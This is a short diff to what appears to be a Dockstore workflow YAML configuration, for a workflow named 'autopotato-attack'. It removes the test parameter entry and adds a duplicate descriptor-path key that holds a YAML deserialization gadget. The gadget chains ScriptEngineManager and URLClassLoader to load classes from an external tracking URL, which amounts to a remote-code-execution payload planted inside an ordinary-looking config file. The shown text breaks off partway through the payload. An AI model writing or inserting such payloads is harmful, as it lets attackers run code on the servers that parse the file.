@@ -4,9 +4,7 @@ workflows:
      name: autopotato-attack
      primaryDescriptorPath: /potato.cwl
      publish: True
-     testParameterFiles:
-         - /test/dockstore.cwl.json
-     other: |
+     primaryDescriptorPath: |
         !!javax.script.ScriptEngineManager [  
            !!java.net.URLClassLoader [[  
                 !!java.net.URL ["https://grabify.link/FTRHRF"]  
